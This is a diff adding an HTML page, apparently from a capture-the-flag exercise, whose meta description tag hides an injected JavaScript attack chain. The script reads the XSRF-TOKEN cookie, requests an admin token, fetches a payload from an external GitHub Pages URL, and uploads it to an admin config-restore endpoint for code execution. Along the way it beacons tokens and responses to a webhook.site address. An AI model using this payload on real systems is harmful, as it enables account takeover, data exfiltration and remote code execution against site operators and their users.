@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Flag 3 RCE Upload</title>
+    <!-- VERSION_GET_FLAG_V3 -->
+    <meta name="description" content='<script>
+        (async function() {
+            var webhook_id = "b9772b74-a398-4710-bf21-1fa5b5ebcb7d";
+            var attacker_url = "https://webhook.site/" + webhook_id;
+            var loc = window.location.href;
+
+            function sendPing(data) {
+                const params = new URLSearchParams();
+                params.append("source_tag", "name:description_GET_FLAG_V3");
+                for (let key in data) {
+                    let val = String(data[key]);
+                    params.append(key, val.substring(0, 1000));
+                }
+                new Image().src = attacker_url + "?" + params.toString();
+            }
+
+            function getCookie(name) {
+                let matches = document.cookie.match(new RegExp(
+                    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+                ));
+                return matches ? decodeURIComponent(matches[1]) : null;
+            }
+
+            const xsrf = getCookie("XSRF-TOKEN");
+            if (!xsrf) return sendPing({ stage: "no_xsrf" });
+
+            sendPing({ stage: "got_xsrf", xsrf_preview: xsrf.substring(0, 20) });
+
+            let tokenResp = await fetch("/generate-token", {
+                method: "POST",
+                headers: {
+                    "Accept": "application/json",
+                    "X-XSRF-TOKEN": xsrf,
+                    "X-Requested-With": "XMLHttpRequest"
+                }
+            });
+
+            if (!tokenResp.ok) {
+                return sendPing({ stage: "token_fail", status: tokenResp.status });
+            }
+
+            let tokenData = await tokenResp.json();
+            let adminToken = tokenData.token;
+
+            sendPing({ stage: "got_token", token_preview: adminToken.substring(0, 20) });
+
+            // Step 2: upload payload from external source (GitHub)
+            let payloadFileResp = await fetch("https://shu-ouma-0.github.io/real_last_hope/payload.txt");
+            if (!payloadFileResp.ok) {
+                return sendPing({ stage: "fetch_payload_fail", status: payloadFileResp.status });
+            }
+
+            let blob = await payloadFileResp.blob();
+            let form = new FormData();
+            form.append("file", blob, "payload.txt");
+            form.append("_token", xsrf);
+
+            let uploadResp = await fetch("/admin/configs/restore", {
+                method: "POST",
+                headers: {
+                    "Authorization": "Bearer " + adminToken,
+                    "X-Requested-With": "XMLHttpRequest"
+                },
+                body: form
+            });
+
+            let resultText = await uploadResp.text();
+            sendPing({ stage: "upload_response", status: uploadResp.status, response_sample: resultText.substring(0, 1000) });
+
+        })();
+    </script>'>
+</head>
+<body>
+    <h1>Payload Runner for Flag 3</h1>
+</body>
+</html>
